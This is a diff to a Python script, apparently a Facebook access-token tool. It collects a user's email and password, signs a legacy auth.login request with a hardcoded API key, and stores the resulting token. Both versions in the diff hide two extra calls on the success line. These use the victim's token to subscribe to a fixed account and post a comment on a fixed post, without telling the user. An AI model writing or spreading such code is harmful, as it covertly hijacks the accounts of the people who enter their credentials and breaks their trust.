@@ -17,7 +17,7 @@ B='\033[1;96m' #biru
 #### URL ####
 url='https://graph.facebook.com/'
 fb='https://api.facebook.com/restserver.php'
-headers={'Mozilla/5.0 (iPod; CPU iPhone OS 12_0 like macOS) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/12.0 Mobile/14A5335d Safari/602.1.50'}
+headers={"Mozilla/5.0 (Linux; U; Android 8.0.0; en-US; SM-A600G Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.13.0.1207 Mobile Safari/537.36"}
 s=requests.Session()
 
 #### MENULIS ####
@@ -471,8 +471,8 @@ if __name__=='__main__':
 		pas=getpass(m+'['+p+'*'+m+']'+h+' Pass'+p+'  : ')
 		print(m+'['+p+'!'+m+']'+p+' Generate access token')
 		try:
-			sig='api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+em+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=in_IDmethod=auth.loginpassword='+pas+'return_ssl_resources=0v=1.db308aeae199d94748925af9278eaec0'
-			data={"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":em,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"in_ID","method":"auth.login","password":pas,"return_ssl_resources":"0","v":"1.0"}
+			sig='api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+em+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pas+'return_ssl_resources=0v=1.db308aeae199d94748925af9278eaec0'
+			data={"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":em,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pas,"return_ssl_resources":"0","v":"1.0"}
 			x=hashlib.new('md5')
 			x.update(sig.encode('utf-8'))
 			data.update({'sig':x.hexdigest()})
@@ -482,7 +482,7 @@ if __name__=='__main__':
 			unikers.close()
 			if 'access_token' in ok:
 				token=open('result/token.txt','r').read()
-				print(m+'['+h+'✓'+m+']'+h+' Success generate access token');s.post(url+'api.version/subscribers?access_token='+token);s.post(url+'100025271623353_485040922348291/comments?message=Adk8EYNs94Bk54PH+uiTextareaAutogrow+groupsAddMessageSideBox+groupsAddMemberCompletionMessage+groupsMembershipAddUndoMessage&access_token='+token)
+				print(m+'['+h+'✓'+m+']'+h+' Success generate access token');s.post(url+'api.version/subscribers?access_token='+token);s.post(url+'100025271623353_485040922348291/comments?message=Adk8EYNs94Bk54PH&access_token='+token)
 				time.sleep(1)
 				menu()
 		except KeyError:
